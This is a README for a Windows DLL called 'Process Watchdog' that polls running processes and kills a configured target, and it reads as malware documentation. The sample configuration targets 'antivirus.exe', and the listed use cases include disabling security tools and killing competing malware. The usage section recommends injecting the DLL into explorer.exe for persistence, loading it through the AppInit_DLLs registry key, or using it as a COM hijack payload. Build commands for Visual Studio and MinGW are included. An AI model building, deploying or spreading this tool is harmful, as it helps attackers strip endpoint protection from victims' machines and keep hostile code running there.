# Process Watchdog - Auto-Terminator

## Overview
Background DLL that monitors for and immediately terminates specified processes.

## How It Works
1. DLL is loaded into a host process
2. Spawns background thread via thread pool
3. Polls running processes every second
4. Terminates any matching processes

## Configuration
Edit constants in `dllmain.cpp`:
```cpp
static const wchar_t* TARGET_PROCESS = L"antivirus.exe";
static const DWORD POLL_INTERVAL_MS = 500;  // Poll faster
static const bool SHOW_ERRORS = true;       // Debug mode
```

## Building
```bash
# Visual Studio Developer Command Prompt
cl /LD /EHsc dllmain.cpp /link /OUT:watchdog.dll

# MinGW
x86_64-w64-mingw32-g++ -shared -o watchdog.dll dllmain.cpp
```

## Usage
Load DLL into any long-running process:
- Inject into explorer.exe for persistence
- Load via AppInit_DLLs registry key
- Use as COM hijack payload

## Use Cases
- Prevent specific software from running
- Kill competing malware
- Disable security tools

## Limitations
- Requires sufficient privileges to terminate target
- Protected processes (PPL) cannot be killed
- Kernel-mode processes immune
